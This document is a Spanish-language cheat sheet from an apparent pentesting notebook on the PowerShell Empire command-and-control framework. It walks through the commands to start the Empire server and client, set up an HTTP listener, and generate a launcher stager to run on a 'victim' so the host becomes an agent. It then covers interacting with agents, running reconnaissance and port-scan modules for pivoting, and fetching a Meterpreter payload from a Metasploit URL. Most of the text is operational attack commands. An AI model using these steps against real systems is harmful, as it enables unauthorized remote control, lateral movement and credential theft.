---
Herramienta: 🕵️‍♂️ PowerShell Empire
Comando: empire
Categoría: Post-explotación
SO: Windows/Linux
tags:
  - post-explotacion
  - c2
  - powershell
---

## Descripción

**PowerShell Empire** es una plataforma de post-explotación y control de comando (C2) diseñada para facilitar la administración y operación de sistemas comprometidos. Utiliza PowerShell para ofrecer un conjunto completo de funcionalidades, desde ejecución remota de comandos hasta el despliegue de payloads.

Considerar combinarlo con starkiller para tener una interfaz gráfica de los listeners y agents activos.

## Características clave

- **C2 completo**: Proporciona un framework modular para controlar agentes en sistemas comprometidos.
- **Uso de PowerShell**: Funciona sin necesidad de binarios adicionales, aprovechando comandos nativos de PowerShell.
- **Soporte multiplataforma**: Compatible con Windows y Linux.
- **Modularidad**: Incluye módulos para tareas específicas como extracción de credenciales, persistencia y movimientos laterales.

## Ejemplo de uso

### Ejemplo 1

Un framework que funciona bien como cliente para poweshell es PowerShell Empire. Para ver como funciona necesitamos lo siguiente:

```bash

#Necesitamos una conexión con un host con windows, puede ser a través de un revershell o un SMB y desde otra pestaña del shell ejecutamos.
powershell-empire server

#Esto desplega el framework del powershell empire. Y para conectar el powershell con la conexión remota tenemos que habrir otra pestaña (total de 3) y ejecutar.

powershell-empire client
```

Este framework sirve para explotación y post-explotación. Este framework nos puede llegar a ser muy útil para pivoting. Vamos a hacer una prueba con diferentes módulos.

```bash

#Una vez hemos logrado establecer conexión con el cliente de poweshell-empire vamos a usar el módulo "uselistener http".

(Empire) > uselistener http

#Ahora tenemos que setear los parametros, en este caso son la IP de nuestro sistema y el puerto que queremos que escuche

set Host ip
set Port 8888
execute

#Si ejecutamos el comando listeners podemos observar los que tenemos configurados y con el comando Main podemos volver a la página principal del framework.

#con el modulo usestager multi/launcher podemos indicarle un listener y nos indicará el comando a ejecutar en la conexión con la victima para meterla en el framework

(Empire) > usestager multi/lancher
set Listener http
execute
```

Si ejecutamos este comando en la conexión (en este caso un SMB) podemos ver como la sesión se añade el powershell empire y si ejecutamos agents podemos ver las sesiones que tenemos dentro del framework.

Ahora, como podemos volver a entrar a este host? muy sencillo

```bash

#Desde el framework de powershell empire vamos a lanzar la instrucción interact y el name del agents que nos aparezca

interact name

#Con esto estaremos dentro del host pero seguiremos utilzando powershell empire, con lo que tenemos acceso a todos los módulos por ejemplo ->

usemodule powershell/situational_awareness/host/computerdetails
execute


#Y nos dará información detallada del host al que nos hemos conectado. Otro modulo de ejemplo interesante

usemodule powershell/situational_awareness/network/portscan

#Este modulo es esencial para hacer pivoting y lo que podemos hacer es ponerle una ip que nosotros no tengamos acceso pero que esta maquina si que tenga acceso

set Hosts ip2
execute

#Tarda en ejecutarse pero nos dará información de los puertos abiertos y si queremos explotarlos ya entrariamos a usar metasploit.
```

**Después del ejemplo 1 de metasploit**:

Desde aquí nos habrá pasado metasploit un comando a ejecutar en el sistema victima, para ello podemos hacer uso de algún modulo de Powershell Empire

```cmd
usemodule powershell/code_execution/invoke_metasploitpayload
set URL url #la de metasploit

#Con esto podemos conseguir una sesion de meterpreter en el metasploit.
```



